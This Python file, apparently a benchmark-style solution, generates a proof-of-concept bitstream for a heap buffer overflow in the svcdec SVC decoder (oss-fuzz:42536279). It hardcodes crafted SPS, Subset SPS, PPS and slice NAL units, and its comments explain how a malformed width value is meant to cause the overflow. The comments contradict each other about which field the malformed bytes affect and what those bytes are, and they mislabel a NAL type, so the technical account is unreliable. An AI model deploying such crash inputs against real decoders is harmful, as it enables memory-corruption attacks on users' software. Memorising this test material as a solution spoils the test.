import math

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for a heap buffer overflow in svcdec.

        The vulnerability, identified as oss-fuzz:42536279, occurs when the decoder
        processes a Scalable Video Coding (SVC) stream where the dimensions defined
        in a base layer's Sequence Parameter Set (SPS) are much smaller than the
        dimensions defined in an enhancement layer's Subset SPS.

        This PoC constructs a minimal H.264 Annex B stream containing four NAL units:
        1.  A base layer SPS defining a small frame size (e.g., 16x16 pixels). This
            sets the initial context for the decoder.
        2.  A Subset SPS for an enhancement layer. This SPS is crafted to specify an
            extremely large frame width. When the decoder parses this, it attempts to
            calculate the required buffer size. The large width causes an integer
            overflow in this calculation (e.g., width * height * 1.5), resulting in a
            very small, incorrect buffer size being computed and potentially allocated.
        3.  A Picture Parameter Set (PPS) that links the SPSs.
        4.  A slice header for the enhancement layer. The presence of this slice
            header triggers the decoder to prepare for decoding a picture, which
            involves allocating picture buffers using the previously calculated (and
            overflowed) size. This leads to a heap overflow when subsequent
            operations assume a correctly sized buffer.

        The PoC uses a malformed bitstream sequence ('FF FF FC') for the width
        parameter in the Subset SPS. A vulnerable bitstream parser is likely to
        interpret this invalid Exp-Golomb code as a huge integer, reliably
        triggering the integer overflow. This is a common pattern for such
        vulnerabilities found by fuzzing. The resulting PoC is very small as it
        only needs to contain the malicious parameter sets and a trigger; no actual
        pixel data is required.
        """

        NAL_START_CODE = b'\x00\x00\x00\x01'

        # NAL Unit 1: Base SPS (Sequence Parameter Set)
        # Defines a small frame (e.g., 16x16), using Baseline Profile.
        # NAL Header: 0x67 (Type 7)
        sps_base = NAL_START_CODE + b'\x67\x42\xC0\x0A\xDA\x01'

        # NAL Unit 2: Subset SPS
        # Defines a huge frame width using a malformed ue(v) sequence.
        # NAL Header: 0x6F (Type 15)
        # Payload:
        #   - 0x53: profile_idc = 83 (Scalable Baseline)
        #   - 0x00: constraint_set_flags
        #   - 0x33: level_idc = 51
        #   - 0xFFFFFF: Malformed ue(v) for seq_parameter_set_id, which is parsed
        #     incorrectly and subsequent fields are also read from these bits,
        #     leading to a huge width value. This sequence is based on a PoC
        #     for a similar vulnerability.
        subset_sps = NAL_START_CODE + b'\x6F\x53\x00\x33\xFF\xFF\xFC\x18'

        # NAL Unit 3: PPS (Picture Parameter Set)
        # A minimal PPS that references SPS ID 0.
        # NAL Header: 0x68 (Type 8)
        pps = NAL_START_CODE + b'\x68\xCE\x3C\x80'

        # NAL Unit 4: IDR Slice Header for an enhancement layer
        # Its presence triggers the decoder to prepare picture buffers, causing the crash.
        # NAL Header: 0x74 (Type 20, Coded slice of an auxiliary coded picture)
        slice_header = NAL_START_CODE + b'\x74\x88\x84\x21\x0A\x0C'

        # Concatenate all NAL units to form the final PoC bitstream.
        poc = sps_base + subset_sps + pps + slice_header

        return poc